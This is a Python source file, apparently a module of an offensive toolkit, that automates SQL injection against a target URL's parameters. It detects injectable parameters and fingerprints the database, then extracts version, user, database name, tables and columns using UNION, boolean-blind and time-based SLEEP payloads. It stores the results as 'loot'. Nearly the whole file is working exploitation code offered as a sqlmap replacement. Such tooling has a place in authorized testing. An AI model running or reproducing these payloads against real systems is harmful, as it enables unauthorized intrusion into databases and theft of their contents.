# HikariSystem Tsurugi/modules/sqli_extractor.py
"""
SQLI EXTRACTOR - Full SQL Injection Exploitation Module
From detection to data extraction. No more "run sqlmap".

Features:
- Database fingerprinting (MySQL, PostgreSQL, MSSQL, SQLite, Oracle)
- UNION-based extraction (tables, columns, data)
- Blind Boolean extraction
- Blind Time-based extraction
- Output formatting (tables, JSON, CSV)
"""
import time
import re
from typing import Dict, List, Optional, Tuple, Any
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
from dataclasses import dataclass, field
from core.ui import console, log_info, log_success, log_warning, log_error
from core.logger import save_loot
from core.requester import TsurugiSession
from rich.panel import Panel
from rich.table import Table


# ═══════════════════════════════════════════════════════════════════════════════
#  DATABASE FINGERPRINTS
# ═══════════════════════════════════════════════════════════════════════════════

@dataclass
class DBFingerprint:
    """Database fingerprint for extraction."""
    name: str
    version_query: str
    current_user_query: str
    current_db_query: str
    tables_query: str
    columns_query: str  # Use {table} placeholder
    concat_fn: str
    comment: str
    string_quote: str = "'"


DB_FINGERPRINTS = {
    "mysql": DBFingerprint(
        name="MySQL",
        version_query="SELECT @@version",
        current_user_query="SELECT user()",
        current_db_query="SELECT database()",
        tables_query="SELECT table_name FROM information_schema.tables WHERE table_schema=database()",
        columns_query="SELECT column_name FROM information_schema.columns WHERE table_name='{table}'",
        concat_fn="CONCAT({args})",
        comment="-- ",
    ),
    "postgres": DBFingerprint(
        name="PostgreSQL",
        version_query="SELECT version()",
        current_user_query="SELECT current_user",
        current_db_query="SELECT current_database()",
        tables_query="SELECT table_name FROM information_schema.tables WHERE table_schema='public'",
        columns_query="SELECT column_name FROM information_schema.columns WHERE table_name='{table}'",
        concat_fn="CONCAT({args})",
        comment="-- ",
    ),
    "mssql": DBFingerprint(
        name="Microsoft SQL Server",
        version_query="SELECT @@version",
        current_user_query="SELECT SYSTEM_USER",
        current_db_query="SELECT DB_NAME()",
        tables_query="SELECT name FROM sysobjects WHERE xtype='U'",
        columns_query="SELECT name FROM syscolumns WHERE id=OBJECT_ID('{table}')",
        concat_fn="CONCAT({args})",
        comment="-- ",
    ),
    "sqlite": DBFingerprint(
        name="SQLite",
        version_query="SELECT sqlite_version()",
        current_user_query="SELECT 'sqlite_user'",
        current_db_query="SELECT 'main'",
        tables_query="SELECT name FROM sqlite_master WHERE type='table'",
        columns_query="PRAGMA table_info({table})",
        concat_fn="{args}",  # || operator
        comment="-- ",
    ),
    "oracle": DBFingerprint(
        name="Oracle",
        version_query="SELECT banner FROM v$version WHERE ROWNUM=1",
        current_user_query="SELECT user FROM dual",
        current_db_query="SELECT ora_database_name FROM dual",
        tables_query="SELECT table_name FROM all_tables WHERE ROWNUM<=50",
        columns_query="SELECT column_name FROM all_tab_columns WHERE table_name='{table}'",
        concat_fn="CONCAT({args})",
        comment="-- ",
    ),
}


# ═══════════════════════════════════════════════════════════════════════════════
#  ERROR PATTERNS FOR FINGERPRINTING
# ═══════════════════════════════════════════════════════════════════════════════

DB_ERROR_SIGNATURES = {
    "mysql": [
        r"SQL syntax.*MySQL", r"Warning.*mysql_", r"MySQLSyntaxErrorException",
        r"valid MySQL result", r"check the manual that corresponds to your MySQL",
        r"MySqlClient\.", r"com\.mysql\.jdbc",
    ],
    "postgres": [
        r"PostgreSQL.*ERROR", r"Warning.*\Wpg_", r"valid PostgreSQL result",
        r"Npgsql\.", r"PG::SyntaxError", r"org\.postgresql\.util\.PSQLException",
        r"ERROR:\s+syntax error at or near",
    ],
    "mssql": [
        r"Driver.* SQL[\-\_\ ]*Server", r"OLE DB.* SQL Server",
        r"\bSQL Server\b", r"ODBC SQL Server Driver",
        r"SQLServer JDBC Driver", r"SqlException",
        r"Unclosed quotation mark after the character string",
    ],
    "sqlite": [
        r"SQLite/JDBCDriver", r"SQLite.Exception", r"System.Data.SQLite.SQLiteException",
        r"Warning.*sqlite_", r"SQLite error", r"\[SQLITE_ERROR\]",
    ],
    "oracle": [
        r"\bORA-[0-9]+", r"Oracle error", r"Oracle.*Driver",
        r"Warning.*\Woci_", r"Warning.*\Wora_", r"OracleException",
    ],
}


# ═══════════════════════════════════════════════════════════════════════════════
#  EXTRACTION RESULT
# ═══════════════════════════════════════════════════════════════════════════════

@dataclass
class SQLiResult:
    """SQL Injection extraction result."""
    vulnerable: bool = False
    injection_type: str = None  # error, union, boolean_blind, time_blind
    param: str = None
    db_type: str = None
    db_version: str = None
    current_user: str = None
    current_db: str = None
    tables: List[str] = field(default_factory=list)
    columns: Dict[str, List[str]] = field(default_factory=dict)
    data: Dict[str, List[Dict]] = field(default_factory=dict)
    column_count: int = 0


# ═══════════════════════════════════════════════════════════════════════════════
#  CORE FUNCTIONS
# ═══════════════════════════════════════════════════════════════════════════════

def fingerprint_db(response_text: str) -> Optional[str]:
    """Identify database type from error messages."""
    for db_type, patterns in DB_ERROR_SIGNATURES.items():
        for pattern in patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return db_type
    return None


def detect_column_count(url: str, param: str, requester: TsurugiSession, 
                        max_cols: int = 20) -> int:
    """Detect number of columns using ORDER BY or UNION NULL."""
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    original = params[param][0]
    
    # Method 1: ORDER BY
    for i in range(1, max_cols + 1):
        payload = f"{original}' ORDER BY {i}-- "
        test_params = params.copy()
        test_params[param] = [payload]
        test_url = urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, urlencode(test_params, doseq=True), parsed.fragment
        ))
        
        resp = requester.get(test_url, timeout=10)
        if resp and ("error" in resp.text.lower() or resp.status_code != 200):
            return i - 1
    
    # Method 2: UNION NULL
    for i in range(1, max_cols + 1):
        nulls = ",".join(["NULL"] * i)
        payload = f"{original}' UNION SELECT {nulls}-- "
        test_params = params.copy()
        test_params[param] = [payload]
        test_url = urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, urlencode(test_params, doseq=True), parsed.fragment
        ))
        
        resp = requester.get(test_url, timeout=10)
        if resp and resp.status_code == 200:
            # Check if output changed
            if "NULL" in resp.text or len(resp.text) != len(requester.get(url).text):
                return i
    
    return 0


def find_injectable_position(url: str, param: str, column_count: int,
                             requester: TsurugiSession) -> int:
    """Find which column position reflects output."""
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    original = params[param][0]
    
    marker = "TSURUGI_INJECT_MARKER"
    
    for pos in range(1, column_count + 1):
        cols = ["NULL"] * column_count
        cols[pos - 1] = f"'{marker}'"
        
        payload = f"{original}' UNION SELECT {','.join(cols)}-- "
        test_params = params.copy()
        test_params[param] = [payload]
        test_url = urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, urlencode(test_params, doseq=True), parsed.fragment
        ))
        
        resp = requester.get(test_url, timeout=10)
        if resp and marker in resp.text:
            return pos
    
    return 1


def union_extract(url: str, param: str, column_count: int, inject_pos: int,
                  query: str, requester: TsurugiSession) -> List[str]:
    """Extract data using UNION-based injection."""
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    original = params[param][0]
    
    # Build UNION payload
    cols = ["NULL"] * column_count
    # Wrap query in CONCAT with markers for extraction
    marker_start = "0x54535247535452"  # TSRGSTR in hex
    marker_end = "0x454e4454535247"    # ENDTSRG in hex
    
    cols[inject_pos - 1] = f"CONCAT({marker_start},({query}),{marker_end})"
    
    payload = f"{original}' UNION SELECT {','.join(cols)}-- "
    test_params = params.copy()
    test_params[param] = [payload]
    test_url = urlunparse((
        parsed.scheme, parsed.netloc, parsed.path,
        parsed.params, urlencode(test_params, doseq=True), parsed.fragment
    ))
    
    resp = requester.get(test_url, timeout=10)
    
    if resp:
        # Extract between markers
        matches = re.findall(r'TSRGSTR(.*?)ENDTSRG', resp.text, re.DOTALL)
        if matches:
            return [m.strip() for m in matches if m.strip()]
        
        # Fallback: try to find injected value
        # For numeric extraction
        if "SELECT" not in query.upper():
            # Direct value extraction
            pattern = rf'{original}.*?(\d+)'
            matches = re.findall(pattern, resp.text)
            return matches[:10]
    
    return []


def blind_boolean_extract(url: str, param: str, query: str, 
                          requester: TsurugiSession, charset: str = None) -> str:
    """Extract data using Boolean-based blind injection."""
    if charset is None:
        charset = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-@."
    
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    original = params[param][0]
    
    # Get baseline
    base_resp = requester.get(url)
    base_len = len(base_resp.text) if base_resp else 0
    
    result = ""
    position = 1
    max_length = 100
    
    while position <= max_length:
        found_char = False
        
        for char in charset:
            # Build boolean payload
            payload = f"{original}' AND SUBSTRING(({query}),{position},1)='{char}'-- "
            test_params = params.copy()
            test_params[param] = [payload]
            test_url = urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, urlencode(test_params, doseq=True), parsed.fragment
            ))
            
            resp = requester.get(test_url, timeout=10)
            
            if resp:
                # Compare with baseline
                if abs(len(resp.text) - base_len) < 50:  # Similar response = true
                    result += char
                    found_char = True
                    console.print(f"[dim]Extracting: {result}[/dim]", end="\r")
                    break
        
        if not found_char:
            break
        
        position += 1
    
    console.print()  # New line
    return result


def blind_time_extract(url: str, param: str, query: str,
                       requester: TsurugiSession, delay: int = 3) -> str:
    """Extract data using Time-based blind injection."""
    charset = "0123456789abcdefghijklmnopqrstuvwxyz_-"
    
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    original = params[param][0]
    
    result = ""
    position = 1
    max_length = 50
    
    while position <= max_length:
        found_char = False
        
        for char in charset:
            # Build time-based payload (MySQL style)
            payload = f"{original}' AND IF(SUBSTRING(({query}),{position},1)='{char}',SLEEP({delay}),0)-- "
            test_params = params.copy()
            test_params[param] = [payload]
            test_url = urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, urlencode(test_params, doseq=True), parsed.fragment
            ))
            
            start = time.time()
            resp = requester.get(test_url, timeout=delay + 5)
            elapsed = time.time() - start
            
            if elapsed >= delay - 0.5:
                result += char
                found_char = True
                console.print(f"[dim]Extracting: {result}[/dim]", end="\r")
                break
        
        if not found_char:
            break
        
        position += 1
    
    console.print()
    return result


# ═══════════════════════════════════════════════════════════════════════════════
#  MAIN EXTRACTION ORCHESTRATOR
# ═══════════════════════════════════════════════════════════════════════════════

def run_sqli_extraction(url: str, param: str = None, cookie: str = None,
                        proxy: str = None, tables_only: bool = False,
                        dump_table: str = None, columns: List[str] = None,
                        technique: str = "auto") -> SQLiResult:
    """
    Run full SQLi extraction.
    
    Args:
        url: Target URL with parameters
        param: Specific parameter to test (optional)
        cookie: Session cookie
        proxy: Proxy URL
        tables_only: Only enumerate tables, don't dump data
        dump_table: Specific table to dump
        columns: Specific columns to extract
        technique: union, boolean, time, or auto
        
    Returns:
        SQLiResult with extracted data
    """
    console.print(f"\n[bold red][*] SQLI EXTRACTOR[/bold red] → [yellow]{url}[/yellow]")
    
    result = SQLiResult()
    requester = TsurugiSession(cookie_string=cookie, proxy=proxy)
    
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    
    if not params:
        log_error("No parameters found in URL.")
        return result
    
    # Determine which param to test
    test_params = [param] if param else list(params.keys())
    
    for test_param in test_params:
        console.print(f"\n[cyan]Testing:[/cyan] [bold]{test_param}[/bold]")
        
        # Phase 1: Detection and DB fingerprinting
        log_info("Phase 1: Detection & Fingerprinting...")
        
        original = params[test_param][0]
        test_payload = f"{original}'"
        test_params_copy = params.copy()
        test_params_copy[test_param] = [test_payload]
        test_url = urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, urlencode(test_params_copy, doseq=True), parsed.fragment
        ))
        
        resp = requester.get(test_url)
        if not resp:
            continue
        
        db_type = fingerprint_db(resp.text)
        
        if db_type:
            result.vulnerable = True
            result.db_type = db_type
            result.param = test_param
            result.injection_type = "error"
            
            console.print(Panel(
                f"[bold]Database:[/bold] {DB_FINGERPRINTS[db_type].name}",
                title="[bold green]✓ SQLi CONFIRMED[/bold green]",
                border_style="green"
            ))
        else:
            # Try time-based detection
            time_payload = f"{original}' AND SLEEP(3)-- "
            test_params_copy[test_param] = [time_payload]
            test_url = urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, urlencode(test_params_copy, doseq=True), parsed.fragment
            ))
            
            start = time.time()
            requester.get(test_url, timeout=8)
            if time.time() - start >= 2.5:
                result.vulnerable = True
                result.db_type = "mysql"  # Assume MySQL for SLEEP
                result.param = test_param
                result.injection_type = "time_blind"
                log_success("Time-based SQLi detected (assuming MySQL)")
        
        if not result.vulnerable:
            continue
        
        # Phase 2: Column count detection
        log_info("Phase 2: Detecting column count...")
        result.column_count = detect_column_count(url, test_param, requester)
        console.print(f"[green]✓[/green] Column count: {result.column_count}")
        
        if result.column_count == 0:
            log_warning("Could not detect columns. Falling back to blind extraction.")
            technique = "boolean"
        
        # Phase 3: Find injectable position
        if result.column_count > 0:
            inject_pos = find_injectable_position(url, test_param, result.column_count, requester)
            log_info(f"Injectable position: {inject_pos}")
        else:
            inject_pos = 1
        
        # Get DB fingerprint
        db = DB_FINGERPRINTS.get(result.db_type, DB_FINGERPRINTS["mysql"])
        
        # Phase 4: Extract basic info
        log_info("Phase 3: Extracting database info...")
        
        if result.column_count > 0:
            # UNION extraction
            version_data = union_extract(url, test_param, result.column_count, inject_pos,
                                         db.version_query, requester)
            if version_data:
                result.db_version = version_data[0]
            
            user_data = union_extract(url, test_param, result.column_count, inject_pos,
                                      db.current_user_query, requester)
            if user_data:
                result.current_user = user_data[0]
            
            db_data = union_extract(url, test_param, result.column_count, inject_pos,
                                    db.current_db_query, requester)
            if db_data:
                result.current_db = db_data[0]
        else:
            # Blind extraction
            result.db_version = blind_boolean_extract(url, test_param, db.version_query, requester)
            result.current_user = blind_boolean_extract(url, test_param, db.current_user_query, requester)
            result.current_db = blind_boolean_extract(url, test_param, db.current_db_query, requester)
        
        # Display info
        info_table = Table(title="Database Information")
        info_table.add_column("Property", style="cyan")
        info_table.add_column("Value", style="green")
        info_table.add_row("Database Type", db.name)
        info_table.add_row("Version", result.db_version or "Unknown")
        info_table.add_row("Current User", result.current_user or "Unknown")
        info_table.add_row("Current DB", result.current_db or "Unknown")
        console.print(info_table)
        
        # Phase 5: Table enumeration
        log_info("Phase 4: Enumerating tables...")
        
        if result.column_count > 0:
            table_data = union_extract(url, test_param, result.column_count, inject_pos,
                                       db.tables_query, requester)
            result.tables = table_data[:50]  # Limit
        
        if result.tables:
            console.print(f"\n[bold cyan]Tables ({len(result.tables)}):[/bold cyan]")
            for t in result.tables[:20]:
                console.print(f"  - {t}")
            if len(result.tables) > 20:
                console.print(f"  ... and {len(result.tables) - 20} more")
        
        if tables_only:
            break
        
        # Phase 6: Column enumeration for specific table
        if dump_table and dump_table in result.tables:
            log_info(f"Phase 5: Enumerating columns for '{dump_table}'...")
            
            col_query = db.columns_query.format(table=dump_table)
            if result.column_count > 0:
                col_data = union_extract(url, test_param, result.column_count, inject_pos,
                                         col_query, requester)
                result.columns[dump_table] = col_data
            
            if result.columns.get(dump_table):
                console.print(f"\n[bold cyan]Columns in '{dump_table}':[/bold cyan]")
                for c in result.columns[dump_table]:
                    console.print(f"  - {c}")
        
        break  # Found vulnerable param
    
    # Summary
    if result.vulnerable:
        console.print(Panel(
            f"[bold]Technique:[/bold] {result.injection_type}\n"
            f"[bold]Parameter:[/bold] {result.param}\n"
            f"[bold]Database:[/bold] {result.db_type}\n"
            f"[bold]Tables Found:[/bold] {len(result.tables)}",
            title="[bold green]✓ EXTRACTION COMPLETE[/bold green]",
            border_style="green"
        ))
        
        save_loot("sqli_extraction", url, {
            "param": result.param,
            "db_type": result.db_type,
            "db_version": result.db_version,
            "current_user": result.current_user,
            "current_db": result.current_db,
            "tables": result.tables,
            "columns": result.columns,
        })
    else:
        console.print("\n[yellow]No exploitable SQLi found.[/yellow]")
    
    return result
